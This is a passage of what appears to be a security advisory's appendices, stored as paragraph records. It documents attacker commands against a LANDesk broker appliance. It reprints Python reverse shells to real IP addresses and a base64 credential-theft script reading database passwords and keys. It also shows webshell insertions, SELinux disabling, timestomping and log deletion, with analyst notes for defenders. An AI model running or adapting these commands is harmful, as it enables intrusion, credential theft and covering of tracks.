+  "text": "{\n          Sep 10 04:36:30 REDACTED gsb[16012]: /etc/php.ini\n          rewritten with new timezone: ';/usr/bin/echo\n          python -c 'import\n          socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"45.\n          33.101.53\n          \",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.sp\n          awn(\"/bin/sh\")'== | /usr/bin/base64 -d | /bin/bash;' (1)\n          }"
+ },
+ {
+  "id": "p226",
+  "text": "{\n          Sep 10 11:48:32 csa gsb[6829]: /etc/php.ini\n          rewritten with new timezone: ';/bin/\n          python -c 'import\n          socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec\n          t((\"156.234.193.18\",44345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\n          os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);';' (1)\n          }"
+ },
+ {
+  "id": "p227",
+  "text": "{\n          Sep 10 05:33:42 REDACTED gsb[17292]: /etc/php.ini\n          rewritten with new timezone: ';/usr/bin/echo\n          import os, re, time\n          os.chdir(\"/tmp\")\n          d = \"/backups/backup-09-01-2024_010101.tar.gz\"\n          with open(\"/opt/landesk/broker/broker.conf\") as f:\n             dbpwd = re.findall(\"PGSQL_PW=(.*)\", f.read\n          ())[0]\n          if os.path.exists(d):\n             os.system(\"tar zxf {}\".format(d))\n             pwd = os.popen(\"export PGPASSWORD={};echo SELECT username,passwd FROM\n          user_info | psql -d brokerdb -U gsbadmin -h\n          localhost\".format(dbpwd)).read().strip()\n             p = pwd.split(':')\n             k = os.popen(\"cat root/.certs/{}.0\".format(p[1])).read().strip()\n             os.system('''export PGPASSWORD={};echo \"INSERT INTO blockedcerts\n          (blockedcerts_idn, core, hash, description, created) VALUES (1, '{}', '1', '{}',\n          '2024-03-13 05:10:16.926012')\"|psql -d brokerdb -U gsbadmin'''.format(dbpwd,\n          k[0:200], k[200:700]))\n             os.system('''export PGPASSWORD={};echo \"INSERT INTO blockedcerts\n          (blockedcerts_idn, core, hash, description, created) VALUES (2, '{}', '2', '{}',"
+ },
+ {
+  "id": "p228",
+  "text": "'2024-03-13 05:10:16.926012')\"|psql -d brokerdb -U gsbadmin'''.format(dbpwd,\n          k[700:900], k[900:]))\n             os.system('''export PGPASSWORD={};echo \"INSERT INTO blockedcerts\n          (blockedcerts_idn, core, hash, description, created) VALUES (3, '{}', '3', '{}',\n          '2024-03-13 05:10:16.926012')\"|psql -d brokerdb -U gsbadmin'''.format(dbpwd,\n          pwd[0:200], pwd[200:700]))\n             time.sleep(60)\n             os.system('''export PGPASSWORD={};echo \"DELETE FROM blockedcerts\"|psql -d\n          brokerdb -U gsbadmin'''.format(dbpwd))\n             os.system(\"rm -rdf *;rm -rf *\")== | /usr/bin/base64 -d | python;' (1)\n          }"
+ },
+ {
+  "id": "p229",
+  "text": "Appendix B: Sudo Commands\n        See Table 14 for a list of known sudo commands executed by the threat actors."
+ },
+ {
+  "id": "p230",
+  "text": "Table 14: Threat Actors’ Use of Sudo Commands"
+ },
+ {
+  "id": "p231",
+  "text": "Command                                              Use"
+ },
+ {
+  "id": "p232",
+  "text": "sudo: nobody : user NOT in sudoers ; TTY=unknown ;\n          PWD=/opt/landesk/broker/webroot/gsb ; USER=root ;\n          COMMAND=/opt/landesk/ldms/LDClient/ldpclient -i ;export\n          PGPASSWORD=`cat /opt/landesk/broker/broker.conf | grep PGSQL_PW |\n          cut -d '=' -f2-`;echo \"update user_info set organization='||/usr/bin/echo\n          aW1wb3J0IG9zLCByZSwgYmFzZTY0LCB0aW1lCm9zLmNoZGlyKCIvdG1wIikK\n          ZCA9ICIvYmFja3VwcyIKZGVmIHNldF9tc2cocCwgdD0nJywgbT0nJyk6CiAgICBp\n          ZiB0IGFuZCBtOgogICAgICAgIG1zZyA9ICdBQXt9Ont9QkInLmZvcm1hdCh0LCBi\n          YXNlNjQuYjY0ZW5jb2RlKG0uZW5jb2RlKCkpLmRlY29kZSgpKQogICAgZWxzZT\n          oKICAgICAgICBtc2cgPSAnJwogICAgb3Muc3lzdGVtKCcnJ2V4cG9ydCBQR1BB\n          U1NXT1JEPXt9O2VjaG8gInVwZGF0ZSB1c2VyX2luZm8gc2V0IG9yZ2FuaXphd\n          Glvbj0ne30nIHdoZXJlIHVzZXJuYW1lPSdhZG1pbicifHBzcWwgLWQgYnJva2VyZ              Updates the\n          GIgLVUgZ3NiYWRtaW4nJycuZm9ybWF0KHAsIG1zZykpCnRyeToKICAgIHIgPSB                “organization” field of\n          tYXgoW29zLnBhdGguam9pbihkLCBmKSBmb3IgZiBpbiBvcy5saXN0ZGlyKGQ                  the “admin” account in\n          pIGlmIG9zLnBhdGguaXNmaWxlKG9zLnBhdGguam9pbihkLCBmKSldLCBrZXk                  the PGSQL database\n          9b3MucGF0aC5nZXRtdGltZSkKZXhjZXB0OgogICAgciA9IE5vbmUKd2l0aCBvc                with python script\n          GVuKCIvb3B0L2xhbmRlc2svYnJva2VyL2Jyb2tlci5jb25mIikgYXMgZjoKICAgIG             decoded from base64.\n          RicHdkID0gcmUuZmluZGFsbCgiUEdTUUxfUFc9KC4qKSIsIGYucmVhZCgpKVs                 The python script\n          wXQppZiByOgogICAgcCA9IG9zLnBvcGVuKCJleHBvcnQgUEdQQVNTV09SRD17                 decompresses the latest\n          fTtlY2hvIFNFTEVDVCBwYXNzd2QgRlJPTSB1c2VyX2luZm8gV0hFUkUgdXNlcm                backup of the PGSQL\n          5hbWU9XFwnYWRtaW5cXCcgfCBwc3FsIC1kIGJyb2tlcmRiIC1VIGdzYmFkbWlu                database and extracts\n          IC1oIGxvY2FsaG9zdCIuZm9ybWF0KGRicHdkKSkucmVhZCgpLnNwbGl0KCJc                  the password for the\n          biIpWy00XS5zdHJpcCgpLnNwbGl0KCc6JykKICAgIG9zLnN5c3RlbSgidGFyIHp               gsbadmin account to\n          4dmYge30iLmZvcm1hdChyKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZm9yI                access the database.\n          GYgaW4gb3MubGlzdGRpcignLicpOgogICAgICAgICAgICBpZiByZS5tYXRjaCgicG\n          hwXHd7Nn0iLCBmKToKICAgICAgICAgICAgICAgIG9zLmNobW9kKGYsIDBvNzc\n          3KQogICAgICAgICAgICAgICAgbSA9IG9zLnBvcGVuKCIuL3t9IHt9IHt9IHt9IHJvb\n          3QvLmNlcnRzL3t9LmtleSB7fSIuZm9ybWF0KGYsIHBbNF0sIHBbNV0sIHBbNl\n          0sIHBbMV0sIHBbMV0pKS5yZWFkKCkuc3RyaXAoKQogICAgICAgICAgICAgICAg\n          aWYgbToKICAgICAgICAgICAgICAgICAgICBzZXRfbXNnKGRicHdkLCAiUEFTU1dP\n          UkQiLCBtKQogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMjQwKQogICAgI\n          CAgICAgICAgICAgICAgIHNldF9tc2coZGJwd2QpCiAgICAgICAgICAgICAgICAgICAg\n          ZXhpdCgpCmVsc2U6CiAgICBzZXRfbXNnKGRicHdkLCAnRVJST1InLCAnTk8gQk\n          FDS1VQJykKICAgIAogICAgCg== | /usr/bin/base64 -d | python||' where\n          username='admin'\"|psql -d brokerdb -U gsbadmin;"
+ },
+ {
+  "id": "p233",
+  "text": "Command                                               Use"
+ },
+ {
+  "id": "p234",
+  "text": "nobody : user NOT in sudoers ; TTY=unknown ; PWD=/usr/bin ; USER=root ;   Temporarily disables\n          COMMAND=/sbin/setenforce 0                                                SELinux."
+ },
+ {
+  "id": "p235",
+  "text": "sudo: admin : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -      Exfiltrates credentials\n          c echo REDACTED_BASE64_PASSWORD | base64                                  and places them in a\n          >/opt/landesk/broker/webroot/gsb/site.cnf                                 site.cnf webfile."
+ },
+ {
+  "id": "p236",
+  "text": "sudo: admin : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -\n          c echo PD9waHAgZXZhbCgkX1BPU1RbImNiNzg2OGM0NjA                            Creates a webshell at\n          zNTQ4NTdiNzE5MjA0ZTI3NjZlZGJlIl0pOw== | base64 -d                         view.php.\n          >/opt/landesk/broker/webroot/gsb/view.php"
+ },
+ {
+  "id": "p237",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n          USER=root ; COMMAND=/subin/tripwire --update ;/usr/bin/echo               Creates a webshell at\n          ZWNobyAiPD9waHAgc3lzdGVtKCcvYmluL3N1ZG8gJy4Gq                             help.php.\n          FwkX1JFUVVFU1RbJ2EnXSk7IiA+IC9vcHQvbGFuZGVzay9icm\n          9rZXIvd2Vicm9vdC9nc2IvaGVscC5waHA= | /usr/bin/base64 -d | /bin/bash;\n                                                                                    Comments out the\n          sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n                                                                                    function\n          USER=root ; COMMAND=/bin/sh -c cd\n                                                                                    setPhpTimeZone in\n          /opt/landesk/broker/webroot/gsb/;sed -i\n                                                                                    DateTimeTab.php that\n          's/setPhpTimeZone($TIMEZONE)/\\/\\/ setPhpTimeZone()/g'\n                                                                                    logs the full exploit\n          /opt/landesk/broker/webroot/gsb/DateTimeTab.php\n                                                                                    command."
+ },
+ {
+  "id": "p238",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n                                                                                    Comments out the\n          USER=root ; COMMAND=/bin/sh -c cd\n                                                                                    vulnerable function\n          /opt/landesk/broker/webroot/gsb/;sed -i 's/setSystemTimeZone(\n                                                                                    setSystemTimeZone in\n          $TIMEZONE )/\\/\\/ setSystemTimeZone( $TIMEZONE )/g'\n                                                                                    DateTimeTab.php.\n          /opt/landesk/broker/webroot/gsb/DateTimeTab.php"
+ },
+ {
+  "id": "p239",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n          USER=root ; COMMAND=/bin/sh -c cd\n                                                                                    Adds a webshell into\n          /opt/landesk/broker/webroot/gsb/;sed -i 's/GSB main page/GSB main\n                                                                                    index.php.\n          page\\neval($_POST[\"in39112cnnpkyc1os01q34gp6r60akgi\"])\\;/g'\n          /opt/landesk/broker/webroot/client/index.php"
+ },
+ {
+  "id": "p240",
+  "text": "Command                                             Use"
+ },
+ {
+  "id": "p241",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n          USER=root ; COMMAND=/bin/sh -c cd\n          /opt/landesk/broker/webroot/gsb/;sed -i 's/$canvas_height =            Adds a webshell into\n          600;/$canvas_height =                                                  style.php.\n          600;\\n\\teval($_POST[\"in39112cnnpkyc1os01q34gp6r60akgi\"]);/'\n          /opt/landesk/broker/webroot/gsb/style.php"
+ },
+ {
+  "id": "p242",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n                                                                                 Timestomping attempt to\n          USER=root ; COMMAND=/bin/sh -c cd\n                                                                                 change the access and\n          /opt/landesk/broker/webroot/gsb/;touch -r\n                                                                                 modification of time of\n          /opt/landesk/broker/webroot/client/about.php\n                                                                                 index.php.\n          /opt/landesk/broker/webroot/client/index.php"
+ },
+ {
+  "id": "p243",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n                                                                                 Timestomping attempt to\n          USER=root ; COMMAND=/bin/sh -c cd\n                                                                                 change the access and\n          /opt/landesk/broker/webroot/gsb/;touch -r\n                                                                                 modification time of\n          /opt/landesk/broker/webroot/client/about.php\n                                                                                 style.php\n          /opt/landesk/broker/webroot/gsb/style.php"
+ },
+ {
+  "id": "p244",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n                                                                                 Timestomping attempt to\n          USER=root ; COMMAND=/bin/sh -c cd\n                                                                                 change the access and\n          /opt/landesk/broker/webroot/gsb/;touch -r\n                                                                                 modification time of\n          /opt/landesk/broker/webroot/client/about.php\n                                                                                 DateTimeTab.php.\n          /opt/landesk/broker/webroot/gsb/DateTimeTab.php"
+ },
+ {
+  "id": "p245",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;   Timestomping attempt to\n          USER=root ; COMMAND=/bin/sh -c cd                                      change the access and\n          /opt/landesk/broker/webroot/gsb/;rm                                    modification time of\n          /opt/landesk/broker/webroot/gsb/help.php                               help.php"
+ },
+ {
+  "id": "p246",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n          USER=root ; COMMAND=/bin/sh -c cd                                      Removes evidence.\n          /opt/landesk/broker/webroot/gsb/;rm /var/log/messages"
+ },
+ {
+  "id": "p247",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n          USER=root ; COMMAND=/bin/sh -c cd                                      Removes site.cnf file\n          /opt/landesk/broker/webroot/gsb/;rm                                    (exfiltrated credentials).\n          /opt/landesk/broker/webroot/gsb/site.cnf"
+ },
+ {
+  "id": "p248",
+  "text": "Command                                            Use"
+ },
+ {
+  "id": "p249",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n          USER=root ; COMMAND=/bin/sh -c cd                                      Removes one of the\n          /opt/landesk/broker/webroot/gsb/;rm                                    original webshells.\n          /opt/landesk/broker/webroot/client/client.php"
+ },
+ {
+  "id": "p250",
+  "text": "sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ;\n          USER=root ; COMMAND=/bin/sh -c cd                                      Removes one of the\n          /opt/landesk/broker/webroot/gsb/;rm                                    original webshells.\n          /opt/landesk/broker/webroot/gsb/view.php"
+ }
+]
